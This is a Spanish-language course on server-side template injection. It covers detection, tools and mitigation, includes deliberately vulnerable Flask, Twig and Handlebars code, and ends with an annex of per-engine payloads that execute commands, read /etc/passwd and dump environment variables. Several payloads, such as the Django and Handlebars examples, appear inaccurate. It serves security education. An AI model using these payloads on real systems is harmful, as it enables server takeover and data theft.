# **Curso Completo de SSTI (Server-Side Template Injection)**

## **1. Introducción**

**¿Qué es SSTI?**  
Server-Side Template Injection (SSTI) es una vulnerabilidad que ocurre cuando un motor de plantillas procesa datos de usuario sin la debida validación, permitiendo ejecutar código arbitrario en el servidor.

**Impacto:**

- Desde filtración de datos hasta ejecución de comandos (RCE).
    
- Dependiente del lenguaje y motor de plantillas.
    
- Crítica en entornos de producción.
    

---

## **2. Motores de Plantillas Comunes**

|Lenguaje|Motor|Características|Ejemplo de Template|
|---|---|---|---|
|Python|Jinja2|Flexible, usado en Flask|`{{ username }}`|
|Python|Django Template|Más seguro por defecto|`{{ username }}`|
|PHP|Twig|Similar a Jinja2|`{{ username }}`|
|PHP|Smarty|Antiguo pero usado|`{$username}`|
|Java|FreeMarker|Plantillas en webapps|`${username}`|
|Java|Thymeleaf|Popular en Spring|`[[${username}]]`|
|JS/Node|Handlebars|Simple, express|`{{username}}`|
|JS/Node|EJS|Popular en Node|`<%= username %>`|

---

## **3. Cómo se Detecta SSTI**

1. **Identificación de inputs reflejados en la plantilla**
    
    - En formularios, URL, cabeceras o JSON.
        
    - Ejemplo: `/hello?name=steven` → respuesta: `Hello steven`.
        
2. **Pruebas iniciales de inyección**
    
    - Payload simple: `{{7*7}}` o `${7*7}` según motor.
        
    - Si devuelve `49`, es vulnerable.
        
3. **Herramientas útiles**
    
    - **tplmap**: Automatiza el descubrimiento y explotación SSTI en Python.
        
    - **Burp Suite**: Para interceptar y modificar requests.
        
    - **Nuclei**: Escaneo rápido usando templates SSTI.
        

---

## **4. Ejemplo en PicoCTF (Aprendizaje)**

**Escenario:** Vulnerabilidad en una app Flask con Jinja2.

**Código vulnerable:**

`from flask import Flask, request, render_template_string app = Flask(__name__)  @app.route('/hello') def hello():     name = request.args.get('name', 'Guest')     template = f"Hello {name}!"     return render_template_string(template)  app.run()`

**Exploit (SSTI PoC):**

`GET /hello?name={{7*7}} HTTP/1.1 Host: 127.0.0.1:5000`

**Resultado esperado:** `Hello 49!`

**Para RCE limitado:**

`GET /hello?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1`

---

## **5. Ejemplos en la Vida Real**

### **Python/Flask (Jinja2)**

`from flask import Flask, request, render_template_string import os app = Flask(__name__)  @app.route('/user') def user():     user_input = request.args.get('name')     return render_template_string(f"Welcome {user_input}!")  # Ejemplo de inyección: # /user?name={{7*7}} # /user?name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`

### **PHP/Twig**

`<?php require_once '/vendor/autoload.php'; $loader = new \Twig\Loader\ArrayLoader([     'index' => 'Hello {{ name }}!', ]); $twig = new \Twig\Environment($loader);  echo $twig->render('index', ['name' => $_GET['name']]);`

**Exploit:**  
`?name={{_self.env.registerUndefinedFilter("system")._self.env.filters.system("ls")}}`

---

### **Node.js / Handlebars**

``const express = require('express'); const Handlebars = require('handlebars'); const app = express();  app.get('/hello', (req, res) => {     const template = Handlebars.compile(`Hello ${req.query.name}!`);     res.send(template({})); });  app.listen(3000);``

**Payload:** `/hello?name={{7*7}}`

---

## **6. Ruta de Explotación Profesional**

1. Identificar inputs reflejados en templates.
    
2. Probar payloads seguros (`{{7*7}}`, `${7*7}`).
    
3. Determinar el motor de plantillas.
    
4. Escalar a RCE **solo en laboratorio**:
    
    - Python: `config.__class__.__init__.__globals__['os'].popen('id').read()`
        
    - PHP: `_self.env.registerUndefinedFilter("system")`
        
5. Automatizar pruebas con tplmap o Nuclei.
    
6. Documentar y reportar vulnerabilidad.
    

---

## **7. Mitigación Real**

- Evitar concatenar strings directamente en plantillas.
    
- Usar funciones de escape de motor (`{{ variable | e }}` en Jinja2).
    
- Limitar permisos del servidor y sandboxing.
    
- Revisar código antes de deploy y usar CI/CD con análisis estático.
    

---

## **8. Herramientas Profesionales**

- **tplmap**: Explora SSTI automáticamente.
    
- **Burp Suite / OWASP ZAP**: Intercepta y prueba inputs.
    
- **Nuclei**: Escaneo masivo con templates SSTI.
    
- **grep + scripts**: Buscar patrones de plantilla peligrosos.
    

---

## **9. Conclusión**

- SSTI es muy peligrosa en producción.
    
- Es fácil de aprender en CTF, pero **su explotación real requiere precaución**.
    
- Aprender SSTI significa **saber identificar, explotar en laboratorio y mitigar en producción**.


# **Anexo: Payloads SSTI por Motor y Lenguaje**

---

## **1. Python – Jinja2 (Flask)**

**Prueba básica:**

`{{7*7}}  → 49 {{'Steven'.upper()}}  → STEVEN`

**Enumerar variables internas:**

`{{config}}  {{config.__class__.__init__.__globals__.keys()}}`

**RCE limitado (solo laboratorio):**

`{{config.__class__.__init__.__globals__['os'].popen('id').read()}} {{config.__class__.__init__.__globals__['subprocess'].getoutput('ls')}}`

**Lectura de archivos:**

`{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}`

**Obtener variables de entorno:**

`{{config.__class__.__init__.__globals__['os'].environ}}`

**Ejecutar comando arbitrario:**

`{{''.__class__.__mro__[1].__subclasses__()[59]('ls',shell=True,stdout=-1).communicate()}}`

---

## **2. Python – Django Template**

**Prueba básica:**

`{{ 7|add:7 }}  → 14 {{ "steven"|upper }} → STEVEN`

**Enumerar objetos:**

`{{ "".class.mro }}`

**RCE limitado:**  
Django es más seguro, pero con versiones antiguas y configuraciones malas se puede usar:

`{% with x="os"|import_module as os %}{{ x.popen("id").read() }}{% endwith %}`

---

## **3. PHP – Twig**

**Prueba básica:**

`{{7*7}} → 49 {{ "steven"|upper }} → STEVEN`

**RCE en laboratorio:**

`{{_self.env.registerUndefinedFilter("system")._self.env.filters.system("ls")}}`

**Leer archivos:**

`{{_self.env.registerUndefinedFilter("file_get_contents")._self.env.filters.file_get_contents("/etc/passwd")}}`

---

## **4. PHP – Smarty**

**Prueba básica:**

`{$username|escape}` 

**Exploit (solo laboratorio):**

`{php}system('ls');{/php}`

> Nota: `{php}` solo funciona en Smarty <3.1.27.

---

## **5. Node.js – Handlebars**

**Prueba básica:**

`{{7*7}} → 49 {{toUpperCase "steven"}} → STEVEN`

**RCE limitado:**

`{{#with "s"}}{{this.constructor.constructor("return process")()}}{{/with}}`

---

## **6. Node.js – EJS**

**Prueba básica:**

`<%= 7*7 %> → 49 <%= "steven".toUpperCase() %> → STEVEN`

**RCE limitado (laboratorio):**

`<%= require('child_process').execSync('id') %>`

---

## **7. Java – FreeMarker**

**Prueba básica:**

`${7*7} → 49 ${"steven"?upper_case} → STEVEN`

**RCE limitado:**

`${"freemarker.template.utility.Execute"?new()("ls")}`

**Leer archivos:**

`${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`

---

## **8. Java – Thymeleaf**

**Prueba básica:**

`[[${7*7}]] → 49`

**Ejecutar comandos (solo laboratorio con versiones inseguras):**

`[[${T(java.lang.Runtime).getRuntime().exec('id')}]]`

---

## **9. Seguridad y Mitigación**

1. Nunca concatenar inputs directamente en plantillas.
    
2. Usar filtros de escape (`|e` en Jinja2/Twig, `escape` en Smarty).
    
3. Limitar privilegios del servidor y sandboxing.
    
4. Deshabilitar filtros peligrosos o módulos no necesarios.
    
5. Revisar la versión del motor de plantillas: muchas vulnerabilidades afectan versiones antiguas.